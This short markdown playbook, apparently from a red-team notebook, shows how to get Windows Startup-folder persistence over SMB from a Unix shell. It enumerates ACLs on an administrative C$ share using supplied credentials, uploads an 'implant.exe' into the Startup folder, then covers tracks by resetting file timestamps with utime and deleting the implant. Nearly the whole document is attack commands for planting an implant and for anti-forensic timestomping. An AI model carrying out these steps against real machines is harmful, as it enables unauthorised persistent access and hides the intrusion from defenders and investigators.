# Unix Shell

TODO: Convert the command lines to remote enumeration

## 01 - Detect

```
$ smbcacls -U "<username>%<password>" //<IP>/C$ "ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
```

Using `smbclient` to enumerate the existing files while enabling `showacls`.

```
smb: \> showacls

smb: \> ls "/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
```

## 02 - Exploit

Take note of the timestamps

```
smb: \> allinfo file.txt

smb: \> put implant.exe
```

## 03 - Cleanup


```
smb: \> help utime
HELP utimes:
		<file name> <create_time> <access_time> <mod_time> <ctime> set times

smb: \> utime file.txt [YY]YY:MM:DD-HH:MM:SS [YY]YY:MM:DD-HH:MM:SS [YY]YY:MM:DD-HH:MM:SS [YY]YY:MM:DD-HH:MM:SS
```

```
smb: \> rm implant.exe
```